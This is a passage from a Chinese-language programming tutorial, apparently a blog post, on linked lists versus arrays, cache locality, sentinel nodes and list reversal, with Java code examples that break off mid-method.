<p>画外音：如果把 CPU 的一个时种看成一秒，则从 L1 读取数据需要 3 秒，从 L2 读取需要 11 秒，L3 读取需要 25 秒，而从内存读取呢，需要 1 分 40 秒，所以程序局部性原理能对 CPU 执行性能有很大的提升。</p>
</blockquote>
<p>&emsp;&emsp;而链表呢，由于链表的每个结点在内存里都是随机分布的，只是通过指针联系在一起，所以这些结点的地址并不相邻，自然无法利用 <strong>程序局部性原理</strong> 来提前加载到 L1，L2，L3 缓存中来提升程序性能。</p>
<blockquote>
<p>画外音：程序局部性原理是计算机中非常重要的原理，这里不做展开，建议大家查阅相关资料详细了解一下。</p>
</blockquote>
<p>&emsp;&emsp;如上所述，相比数组，链表的<strong>非连续</strong>、<strong>非顺序</strong>确实让它在性能上处于劣势，那什么情况下该使用链表呢？考虑以下情况：</p>
<ul>
<li>大内存空间分配<br>&emsp;&emsp;由于数组空间的<strong>连续性</strong>，如果要为数组分配 500M 的空间，这 500M 的空间必须是<strong>连续的</strong>、未使用的，所以在内存空间的分配上数组的要求会比较严格，如果内存碎片太多，分配连续的大空间很可能导致失败。而链表由于是非连续的，所以这种情况下选择链表更合适。</li>
<li>元素频繁删除和插入<br>&emsp;&emsp;如果涉及到元素的频繁删除和插入，用链表就会高效很多，对于数组来说，如果要在元素间插入一个元素，需要把其余元素一个个往后移（如图示），以为新元素腾空间（同理，如果是删除则需要把被删除元素之后的元素一个个往前移），效率上无疑是比较低的。</li>
</ul>
<figure class="image-box">
                <img src="5.gif" alt="（在 1，2 间插入 5，需要把 2，3，4 同时往后移一位）" title class>
                <p>（在 1，2 间插入 5，需要把 2，3，4 同时往后移一位）</p>
            </figure>

<p>&emsp;&emsp;而链表的插入删除相对来说就比较简单了，修改指针位置即可，其他元素无需做任何移动操作（如图示：以插入为例）。</p>
<figure class="image-box">
                <img src="6.gif" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;综上所述：如果数据以查为主，很少涉及到增和删，选择数组，如果数据涉及到频繁的插入和删除，或元素所需分配空间过大，倾向于选择链表。  </p>
<p>&emsp;&emsp;说了这么多理论，相信读者对数组和链表的区别应该有了更深刻地认识了，尤其是 <strong>程序局部性原理</strong>，是不是开了不少眼界 ^_^，如果面试中问到数组和链表的区别能回答到程序局部性原理，会是一个<strong>非常大的亮点</strong>！<br>&emsp;&emsp;接下来我们来看看链表的表现形式和解题技巧。<br>&emsp;&emsp;需要说明的是有些代码像打印链表等限于篇幅的关系没有在文中展示，我把文中所有相关代码都放到 github 中了，大家如果需要，可以访问我的 GitHub 地址：<a href="https://github.com/allentofight/algorithm" target="_blank" rel="noopener">https://github.com/allentofight/algorithm</a> 下载运行（微信不支持外链，建议大家 copy 之后浏览器打开再下载运行），文中所有代码均已用 Java 实现并运行通过。</p>
<h1 id="链表的表示"><a href="#链表的表示" class="headerlink" title="链表的表示"></a>链表的表示</h1><p>&emsp;&emsp;由于链表的特点（查询或删除元素都要从头结点开始），所以我们只要在链表中定义头结点即可，另外如果要频繁用到链表的长度，还可以额外定义一个变量来表示。<br>&emsp;&emsp;需要注意的是这个头结点的定义是有讲究的，一般来说头结点有两种定义形式，一种是直接以某个元素结点为头结点，如下：</p>
<figure class="image-box">
                <img src="7.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;一种是以一个虚拟的节点作为头结点，即我们常说的<strong>哨兵</strong>，如下：</p>
<figure class="image-box">
                <img src="8.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;定义这个哨兵有啥好处呢，假设我们不定义这个哨兵，来看看链表及添加元素的基本操作怎么定义的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 链表中的结点，data代表节点的值，next是指向下一个节点的引用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data;<span class="comment">// 结点的数组域，值</span></span><br><span class="line">    Node next = <span class="keyword">null</span>;<span class="comment">// 节点的引用，指向下一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 链表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>; <span class="comment">// 链表长度，非必须，可不加</span></span><br><span class="line">    Node head = <span class="keyword">null</span>; <span class="comment">// 头结点</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNode</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">            head = <span class="keyword">new</span> Node(val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Node tmp = head;</span><br><span class="line">            <span class="keyword">while</span> (tmp.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                tmp = tmp.next;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp.next = <span class="keyword">new</span> Node(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;发现问题了吗，注意看下面代码：</p>
<figure class="image-box">
                <img src="9.webp" alt title class>
                <p></p>
            </figure>

<p>有两个问题：</p>
<ol>
<li>每插入一个元素都要对头结点进行判空比较，如果一个链表有很多元素需要插入，就需要进行很多次的判空处理，不是那么高效</li>
<li>头结点与其他结点插入逻辑不统一（一个需要判空后再插入，一个不需要判空直接插入），从程序逻辑性来说不是那么合理（因为结点与结点是平级，添加逻辑理应相同）</li>
</ol>
<p>&emsp;&emsp;如果定义了哨兵结点，以上两个问题都可解决，来看下使用哨兵结点的链表定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>; <span class="comment">// 链表长度，非必须，可不加</span></span><br><span class="line">    Node head = <span class="keyword">new</span> Node(<span class="number">0</span>); <span class="comment">// 哨兵结点</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNode</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        Node tmp = head;</span><br><span class="line">        <span class="keyword">while</span> (tmp.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            tmp = tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp.next = <span class="keyword">new</span> Node(val);</span><br><span class="line">        length++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到，定义了哨兵结点的链表逻辑上清楚了很多，不用每次插入元素都对头结点进行判空，也统一了每一个结点的添加逻辑。<br>&emsp;&emsp;所以之后的习题讲解中我们使用的链表都是使用定义了哨兵结点的形式。  </p>
<p>&emsp;&emsp;做了这么多前期的准备工作，终于要开始我们的正餐了：链表解题常用套路 —— 翻转！</p>
<h1 id="链表常见解题套路-——-翻转"><a href="#链表常见解题套路-——-翻转" class="headerlink" title="链表常见解题套路 —— 翻转"></a>链表常见解题套路 —— 翻转</h1><h2 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h2><p>&emsp;&emsp;既然我们要用链表解题，那我们首先就构造一个链表吧 题目：给定数组 1，2，3，4 构造成如下链表 <code>head --&gt; 4 --&gt; 3 --&gt; 2 --&gt; 1</code>。<br>&emsp;&emsp;看清楚了，是逆序构造链表！顺序构造我们都知道怎么构造，对每个元素持续调用上文代码定义的 addNode 方法即可（即尾插法），与尾插法对应的，是<strong>头插法</strong>，即把每一个元素插到头节点后面即可，这样就能做到逆序构造链表，如图示（以插入 1，2 为例）：</p>
<figure class="image-box">
                <img src="10.gif" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;头插法比较简单，直接上代码，直接按以上动图的步骤来完成逻辑，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>; <span class="comment">// 链表长度，非必须，可不加</span></span><br><span class="line">    Node head = <span class="keyword">new</span> Node(<span class="number">0</span>); <span class="comment">// 哨兵节点</span></span><br><span class="line">    </span><br><span class="line">     <span class="comment">// 头插法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">headInsert</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1.构造新结点</span></span><br><span class="line">        Node newNode = <span class="keyword">new</span> Node(val);</span><br><span class="line">        <span class="comment">// 2.新结点指向头结点之后的结点</span></span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        <span class="comment">// 3.头结点指向新结点</span></span><br><span class="line">        head.next = newNode;</span><br><span class="line">        length++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LinkedList linkedList = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="comment">// 头插法构造链表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            linkedList.headInsert(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打印链表，将打印 4--&gt;3--&gt;2--&gt;1</span></span><br><span class="line">        linkedList.printList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>&emsp;&emsp;现在我们加大一下难度，来看下曾经的 Google 面试题： 给定单向链表的头指针和一个节点指针，定义一个函数在 <code>O(1)</code> 内删除这个节点。</p>
<figure class="image-box">
                <img src="11.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如图示：即给定值为 2 的结点，如何把 2 给删了。  </p>
<p>&emsp;&emsp;我们知道，如果给定一个结点要删除它的后继结点是很简单的，只要把这个结点的指针指向后继结点的后继结点即可。</p>
<figure class="image-box">
                <img src="12.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如图示：给定结点 2，删除它的后继结点 3， 把结点 2 的 next 指针指向 3 的后继结点 4 即可。  </p>
<p>&emsp;&emsp;但给定结点 2，该怎么删除结点 2 本身呢？注意题目没有规定说不能改变结点中的值，所以有一种很巧妙的方法，狸猫换太子！我们先通过结点 2 找到结点 3，再把节点 3 的值赋给结点 2，此时结点 2 的值变成了 3，这时候问题就转化成了上图这种比较简单的需求，即根据结点 2 把结点 3 移除即可，看图：</p>
<figure class="image-box">
                <img src="13.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;不过需要注意的是这种解题技巧只适用于被删除的指定结点是中间结点的情况，如果指定结点是尾结点，还是要老老实实地找到尾结点的前继结点，再把尾结点删除，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除指定的结点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> deletedNode</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeSelectedNode</span><span class="params">(Node deletedNode)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果此结点是尾结点我们还是要从头遍历到尾结点的前继结点，再将尾结点删除</span></span><br><span class="line">    <span class="keyword">if</span> (deletedNode.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Node tmp = head;</span><br><span class="line">        <span class="keyword">while</span> (tmp.next != deletedNode) &#123;</span><br><span class="line">            tmp = tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到尾结点的前继结点，把尾结点删除</span></span><br><span class="line">        tmp.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Node nextNode = deletedNode.next;</span><br><span class="line">        <span class="comment">// 将删除结点的后继结点的值赋给被删除结点</span></span><br><span class="line">        deletedNode.data = nextNode.data;</span><br><span class="line">        <span class="comment">// 将 nextNode 结点删除</span></span><br><span class="line">        deletedNode.next = nextNode.next;</span><br><span class="line">        nextNode.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="入门到进阶：链表翻转"><a href="#入门到进阶：链表翻转" class="headerlink" title="入门到进阶：链表翻转"></a>入门到进阶：链表翻转</h2><p>&emsp;&emsp;接下来我们会重点看一下链表的翻转，链表的翻转可以衍生出很多的变形，是面试中非常热门的考点，基本上考链表必考翻转！所以掌握链表的翻转是必修课！  </p>
<p>&emsp;&emsp;什么是链表的翻转：给定链表 <code>head --&gt; 4 --&gt; 3 --&gt; 2 --&gt; 1</code>，将其翻转成 <code>head --&gt; 1 --&gt; 2 --&gt; 3 --&gt; 4</code>，由于翻转链表是如此常见，如此重要，所以我们分别详细讲解下如何用递归和非递归这两种方式来解题。</p>
<h3 id="递归翻转"><a href="#递归翻转" class="headerlink" title="递归翻转"></a>递归翻转</h3><p>&emsp;&emsp;关于递归的文章之前写了三篇，如果之前没读过的，强烈建议点击<a href="https://mp.weixin.qq.com/s?__biz=MzI5MTU1MzM3MQ==&mid=2247483879&idx=1&sn=4071749be94e561c7f323907396e6829&scene=21#wechat_redirect" target="_blank" rel="noopener">这里</a>查看，总结了递归的常见解题套路，给出了递归解题的常见四步曲，如果看完对以下递归的解题套路会更加深刻，这里不做赘述了，我们直接套递归的解题思路：<br>&emsp;&emsp;首先我们要查看翻转链表是否符合递归规律：问题可以分解成<strong>具有相同解决思路</strong>的子问题，子子问题…… 直到最终的子问题再也无法分解。<br>&emsp;&emsp;要翻转 <code>head --&gt; 4 --&gt; 3 --&gt; 2 --&gt; 1</code> 链表，不考虑 head 结点，分析 <code>4 --&gt; 3 --&gt; 2 --&gt; 1</code>，仔细观察我们发现只要先把 <code>3 --&gt; 2 --&gt; 1</code> 翻转成 <code>3 &lt;-- 2 &lt;-- 1</code>，之后再把 3 指向 4 即可（如下图示）。</p>
<figure class="image-box">
                <img src="14.webp" alt="图：翻转链表主要三步骤" title class>
                <p>图：翻转链表主要三步骤</p>
            </figure>

<p>&emsp;&emsp;只要按以上步骤定义好这个翻转函数的功能即可， 这样由于子问题与最初的问题<strong>具有相同的解决思路</strong>，拆分后的子问题持续调用这个翻转函数即可达到目的。  </p>
<p>&emsp;&emsp;注意看上面的步骤 1，问题的规模是不是缩小了（如下图），从翻转整个链表变成了只翻转部分链表！问题与子问题都是从某个结点开始翻转，<strong>具有相同的解决思路</strong>，另外当缩小到只翻转一个结点时，显然是终止条件，符合递归的条件！之后的翻转 <code>3 --&gt; 2 --&gt; 1</code>，<code>2 --&gt; 1</code> 持续调用这个定义好的递归函数即可！</p>
<figure class="image-box">
                <img src="15.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;既然符合递归的条件，那我们就可以套用<a href="https://mp.weixin.qq.com/s?__biz=MzI5MTU1MzM3MQ==&mid=2247483813&idx=1&sn=423c8804cd708b8892763a41cfcc8886&scene=21#wechat_redirect" target="_blank" rel="noopener">递归四步曲</a>来解题了（注意翻转之后 head 的后继节点变了，需要重新设置！别忘了这一步）。</p>
<ol>
<li><p>定义递归函数，明确函数的功能 根据以上分析，这个递归函数的功能显然是翻转某个节点开始的链表，然后返回新的头结点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 翻转结点 node 开始的链表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">invertLinkedList</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>寻找递推公式 上文中已经详细画出了翻转链表的步骤，简单总结一下递推步骤如下：</p>
<ul>
<li>针对结点 node（值为 4），先翻转 node 之后的结点 <code>invert(node-&gt;next)</code>，翻转之后 <code>4 --&gt; 3 --&gt; 2 --&gt; 1</code> 变成了 <code>4 --&gt; 3 &lt;-- 2 &lt;-- 1</code>；</li>
<li>再把 node 节点的下个节点（3）指向 node，node 的后继节点设置为空（避免形成环），此时变成了 <code>4 &lt;-- 3 &lt;-- 2 &lt;-- 1</code>；</li>
<li>返回新的头结点，因为此时新的头节点从原来的 4 变成了 1，需要重新设置一下 head。</li>
</ul>
</li>
<li><p>将递推公式代入第一步定义好的函数中，如下 <code>invertLinkedList</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归翻转结点 node 开始的链表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">invertLinkedList</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤 1：先翻转 node 之后的链表</span></span><br><span class="line">    Node newHead = invertLinkedList(node.next);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤 2：再把原 node 节点后继结点的后继结点指向 node (4)，node 的后继节点设置为空(防止形成环)</span></span><br><span class="line">    node.next.next = node;</span><br><span class="line">    node.next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤 3：返回翻转后的头结点</span></span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    LinkedList linkedList = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    <span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        linkedList.addNode(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    Node newHead = linkedList.invertLinkedList(linkedList.head.next);</span><br><span class="line">    <span class="comment">// 翻转后别忘了设置头结点的后继结点！</span></span><br><span class="line">    linkedList.head.next = newHead;</span><br><span class="line">    linkedList.printList();      <span class="comment">// 打印 1，2，3，4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<blockquote>
<p>画外音：翻转后由于 head 的后继结点变了，别忘了重新设置哦！</p>
</blockquote>
<ol start="4">
<li>计算时间/空间复杂度 由于递归调用了 n 次 invertLinkedList 函数，所以时间复杂度显然是 <code>O(n)</code>，空间复杂度呢，没有用到额外的空间，但是由于递归调用了 n 次 invertLinkedList 函数，压了 n 次栈，所以空间复杂度也是 <code>O(n)</code>。  </li>
</ol>
<p>&emsp;&emsp;递归一定要从函数的功能去理解，从函数的功能看，定义的递归函数清晰易懂，定义好了之后，由于问题与被拆分的子问题具有相同的解决思路，所以子问题只要持续调用定义好的功能函数即可，切勿层层展开子问题，此乃递归常见的陷阱！仔细看函数的功能，其实就是按照下图实现的。（对照着代码看，是不是清晰易懂 ^_^）</p>
<figure class="image-box">
                <img src="16.webp" alt title class>
                <p></p>
            </figure>

<h3 id="非递归翻转链表（迭代解法）"><a href="#非递归翻转链表（迭代解法）" class="headerlink" title="非递归翻转链表（迭代解法）"></a>非递归翻转链表（迭代解法）</h3><p>&emsp;&emsp;我们知道递归比较容易造成栈溢出，所以如果有其他时间/空间复杂度相近或更好的算法，应该优先选择非递归的解法，那我们看看如何用迭代来翻转链表，主要思路如下：</p>
<figure class="image-box">
                <img src="17.webp" alt title class>
                <p></p>
            </figure>

<ol>
<li><p>定义两个节点：pre，cur，其中 cur 是 pre 的后继结点，如果是首次定义，需要把 pre 指向 cur 的指针去掉，否则由于之后链表翻转，cur 会指向 pre，就进行了一个环（如下），这一点需要注意。</p>
<figure class="image-box">
                <img src="18.webp" alt title class>
                <p></p>
            </figure>
</li>
<li><p>知道了 cur 和 pre，翻转就容易了，把 cur 指向 pre 即可，之后把 cur 设置为 pre，cur 的后继结点设置为 cur 一直往前重复此步骤即可，完整动图如下：</p>
<figure class="image-box">
                <img src="19.gif" alt title class>
                <p></p>
            </figure>

</li>
</ol>
<p>&emsp;&emsp;注意：同递归翻转一样，迭代翻转完了之后 head 的后继结点从 4 变成了 1，记得重新设置一下。  </p>
<p>&emsp;&emsp;知道了解题思路，实现代码就容易多了，直接上代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 迭代翻转</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">iterationInvertLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 步骤 1</span></span><br><span class="line">    Node pre = head.next;</span><br><span class="line">    Node cur = pre.next;</span><br><span class="line">    pre.next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 务必注意：在 cur 指向 pre 之前一定要先保留 cur 的后继结点，不然 cur 指向 pre 后就再也找不到后继结点了</span></span><br><span class="line"><span class="comment">         * 也就无法对 cur 后继之后的结点进行翻转了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Node next = cur.next;</span><br><span class="line">        cur.next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此时 pre 为头结点的后继结点</span></span><br><span class="line">    head.next = pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;用迭代的思路来做由于循环了 n 次，显然时间复杂度为 <code>O(n)</code>，另外由于没有额外的空间使用，也未像递归那样调用递归函数不断压栈，所以空间复杂度是 <code>O(1)</code>，对比递归，显然应该使用迭代的方式来处理！  </p>
<p>&emsp;&emsp;花了这么大的精力我们总算把翻转链表给搞懂了，如果大家看了之后几道翻转链表的变形，会发现我们花了这么大篇幅讲解翻转链表是值得的。</p>
<hr>
<p>&emsp;&emsp;接下来我们来看看链表翻转的变形。  </p>
<blockquote>
<p>&emsp;&emsp;变形题 1：给定一个链表的头结点 head，以及两个整数 from 和 to，在链表上把第 from 个节点和第 to 个节点这一部分进行翻转。 例如：给定如下链表：from = 2，to = 4 <code>head --&gt; 5 --&gt; 4 --&gt; 3 --&gt; 2 --&gt; 1</code>，将其翻转后，链表变成 <code>head --&gt; 5 --&gt; 2 --&gt; 3 --&gt; 4 --&gt; 1</code>。</p>
</blockquote>
<p>&emsp;&emsp;有了之前翻转整个链表的解题思路，现在要翻转部分链表就相对简单多了，主要步骤如下：</p>
<ol>
<li>根据 from 和 to 找到 from - 1，from，to，to + 1 四个结点（注意<strong>临界条件</strong>，如果 from 从头结点开始，则 from - 1 结点为空，翻转后需要把 to 设置为头结点的后继结点， from 和 to 结点也可能超过尾结点，这两种情况不符合条件不翻转）；</li>
<li>对 from 到 to 的结点进行翻转；</li>
<li>将 from - 1 节点指向 to 结点，将 from 结点指向 to + 1 结点。</li>
</ol>
<figure class="image-box">
                <img src="20.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;知道了以上的思路，代码就简单了，按上面的步骤 1，2，3 实现，注释也写得很详细，看以下代码（对 from 到 to 结点的翻转我们使用迭代翻转，当然使用递归也是可以的，限于篇幅关系不展开，大家可以尝试一下）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 迭代翻转 from 到 to 的结点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">iterationInvertLinkedList</span><span class="params">(<span class="keyword">int</span> fromIndex, <span 